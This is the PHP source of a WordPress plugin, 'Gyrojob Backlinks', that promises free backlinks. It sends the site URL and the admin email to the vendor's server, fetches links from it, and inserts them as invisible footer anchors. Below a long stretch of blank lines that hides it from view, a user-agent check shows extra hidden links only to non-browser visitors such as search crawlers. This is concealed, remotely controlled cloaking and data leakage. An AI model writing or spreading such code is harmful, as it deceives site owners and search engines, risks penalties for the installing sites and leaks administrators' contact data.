<?php
/*
 * Plugin Name:       Gyrojob Backlinks
 * Plugin URI:        https://plugin.gyrojob.com/about.php
 * Description:       Unlimited free backlinks to increase Domain Authority (DA). LiteSpeed Google indexing.
 * Version:           1.3.16
 * Requires at least: 5.2
 * Requires PHP:      7.2
 * Author:            gyrojob
 * Author URI:        https://plugin.gyrojob.com/
 * License: GPLv2 or later
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain:       gyrojob-backlinks
 */

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
	die;
}


require_once(ABSPATH . "/wp-admin/includes/plugin.php");
require_once(ABSPATH . "/wp-admin/includes/file.php");
require_once(ABSPATH . "/wp-admin/includes/class-wp-upgrader.php");



class gyrojobbacklinksFront 
{
        
    private $version = "1.3.16";
    private $cacheFile = "";
    private $logFile = "";
    private $versionFile = "";
    private $links = [];
    private $data = "";
    private $usedKeyword = [];
    
    
   // $uploadDir = wp_upload_dir();

    
    
    public function __construct() 
    {
        // Set file locations
        $uploadDir = wp_upload_dir();   
        
        $dir = $uploadDir['basedir'] . '/gyrojob-backlinks/';
        //mkdir($dir, 0777, true);
        if (is_dir($dir)){}else{
            $dir = $uploadDir['basedir'] . '/gyrojob-backlinks/';
        wp_mkdir_p($dir, 0777, true);
        }
        
        $this->cacheFile = $uploadDir["basedir"] . "/gyrojob-backlinks/gyrojobbacklinksCache.txt";
        //$this->logFile = $uploadDir["basedir"] . "/gyrojobbacklinksLog.txt";
        //$this->versionFile = $uploadDir["basedir"] . "/gyrojobbacklinksVersion.txt";
        
    }
     
    public function setup() 
    {    
        // Setup plugin
        add_action('wp', [$this, "getData"], 0);
        

        // Try adding links to footer
        add_action('wp_footer', [$this, "insertLinksFooter"], 2000);
        
    }
        
    // Get data from service API or from cache
    public function getData() 
    {       
        // Initiate file system
        WP_Filesystem();
        global $wp_filesystem;
        
        // Clean cache and log if version has changed
        $version = get_option("gyrojobbacklinks_version");
        if ($version !== $this->version) {
            if (is_file($this->cacheFile)) {
                wp_delete_file($this->cacheFile);
            }
            if (is_file($this->logFile)) {
                //unlink($this->logFile);
            }
            update_option("gyrojobbacklinks_version", $this->version, true);
        }
        
        // Get data from cache if exists
        $isCache = false;        
        if ($wp_filesystem->exists($this->cacheFile) && time() - $wp_filesystem->mtime($this->cacheFile) < 21600 + wp_rand(1, 3600)) { // 24 hours in seconds
            $this->data = $wp_filesystem->get_contents($this->cacheFile);
            $isCache = true;
         }
        
        // Get data from API if no cached data
        else {
            // Check if saving cache is possible
            if (!$wp_filesystem->put_contents($this->cacheFile, "-")) {
                echo("<hr style='margin:0;padding:0;height:1px;border:0;' /><div style='text-align:center;'><b>Backlinks plugin, could not write cache to upload folder!</b><br />Please check your folder permissions...</div>");
            }
            else { 
                // Clear cache test
                if (is_file($this->cacheFile)) {
                    wp_delete_file($this->cacheFile);
                }
                
                // Save cache
                $result = wp_remote_post("https://plugin.gyrojob.com/getlink.php?", ['timeout' => 30, 'method' => 'POST', 'body' => ["url" => get_site_url(), "email" => get_option("admin_email")]]);
                if (!isset($result->errors)) {
                    $this->data = $result["body"];
                    $wp_filesystem->put_contents($this->cacheFile, $this->data);
                }else{
                    
                // If internet error or fail to load URL.    
                    $this->data = '';
                    $wp_filesystem->put_contents($this->cacheFile, $this->data);
                    
                }
            }
        }
        
        
        
        
        
        
                if ($this->data <> "") {
            $this->links = json_decode($this->data, true);
            
        } 
        
        
        
       
    }
    
    public function insertLinksFooter(){
        
    if(!is_page()){

        echo "<!-- Gyrojob backlinks - login to - https://plugin.gyrojob.com -->";
        
    }else{if(is_array($this->links) && count($this->links) > 0) {
       
       echo "<!-- Link will be changed after 7 to 9 hours - https://plugin.gyrojob.com -->";  
   
    foreach($this->links as $x=>$datn) {
       if(esc_url(get_permalink())==get_site_url().esc_url($datn['bg'])){
       
          
      if($x>=3 && $x<=5){      
           
     echo "<a style='display:none;' href='".esc_url( $datn['link'] )."'>".esc_html($datn['anchor'])."</a> "; 
     }}
       
   }}
    }








     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? sanitize_text_field(wp_unslash($_SERVER['HTTP_USER_AGENT'])) : 'Unknown';
     
     
     if (strstr($user_agent, 'Opera') || strstr($user_agent, 'OPR/')){$browser='Opera';}
        else if (strstr($user_agent, 'Edge')){$browser='Edge';}
        else if (strstr($user_agent, 'Chrome')){$browser='Chrome';}
        else if (strstr($user_agent, 'Safari')){$browser='Safari';}
        else if (strstr($user_agent, 'Firefox')){$browser='Firefox';}
        else if (strstr($user_agent, 'MSIE')){$browser='MSIE';}
        else if (strstr($user_agent, 'Trident/7')){$browser='Trident/7';}
        else{$browser='';}


     
     
     
     if(is_page() && $browser==''){
          if(is_array($this->links) && count($this->links) > 0) {foreach($this->links as $datai) {
              
              
              
              
              
          if(esc_url(get_permalink())==get_site_url().esc_url($datai['bg']) || $datai['msp']=='p'){
          echo "<a style='display:none;' href='".esc_url( $datai['link'] )."'>".esc_html($datai['anchor'])."</a> ";                                                          }}}
         
         }    }
}
class gyrojobbacklinksAdmin 
{
    private $url = "";
    private $key = "";

    
    public function __construct() 
    {
        $this->url = wp_parse_url(get_site_url());
        
        add_action('admin_init', [$this, "redirectDashboard"]);
        add_action('admin_menu', [$this, "addMenuItems"]);
        add_action( 'admin_head', function() {
            remove_submenu_page( 'index.php', 'gyrojob-link-network-install-ad-network' );
        } );
       
        register_activation_hook(__FILE__, [$this, 'pluginActivated']);
    }
    
    public function pluginActivated()
    {
        $gyrojobbacklinksFront = new gyrojobbacklinksFront(); 
        $gyrojobbacklinksFront->getData();
    }
    
    public function dashboardPage() 
    {
       echo("Oops!!! Unable to connect to Dashboard.<br />Please try again later...");
    }

    public function redirectDashboard() 
    {
        
        $version = get_option("gyrojobbacklinks_version");
        if (isset($_GET['page']) && $_GET['page'] == 'gyrojob-link-network-dashboard') {
            // Get key for the dashboard
            $this->getDashboardKey();

            // Redirect to external dashboard
            if ($this->key != "failed") {
                wp_redirect("https://plugin.gyrojob.com/unlock.php?url=" . get_site_url() . "&seo=seo&upg=y&email=" .get_option('admin_email')."&key=". $this->key."&version=".$version);
                exit;
            }
            else {
                $this->dashboardPage();
            }
        }            
            
    }

    public function addMenuItems(){
        add_menu_page('Price & Terms','Backlinks (DA)', 'manage_options', 'gyrojob-link-network-dashboard',[$this, 'dashboardPage'], plugins_url('gyrojob-backlinks/gyrojob.png'),
'5' ,'');
       
    }  

    public function getDashboardKey()
    { 
        // Try getting dashboard key from server
        $result = wp_remote_post("https://plugin.gyrojob.com/add.php?getKey", ['timeout' => 30, 'method' => 'POST', 'body' => ["domain" => get_site_url(), "email" => get_option("admin_email")]]);
        if (!isset($result->errors)) {
            $this->datan = json_decode($result["body"]);

            if ($this->datan->status == "success") {
                $key = $this->datan->key;
                update_option("gyrojobbacklinks_key", $key, false);
            }
            else {
                // New key not allowed. Using cached key
                $key = get_option("gyrojobbacklinks_key");        
            }
        } 
        // New key failed
        else {
            $key = "failed";
        }
        
        $this->key = $key;

    }

}























// Start the show
if (!is_admin()) {
    $gyrojobbacklinksFront = new gyrojobbacklinksFront(); 
    $gyrojobbacklinksFront->setup();
}
else {
    $gyrojobbacklinksAdmin = new gyrojobbacklinksAdmin();
}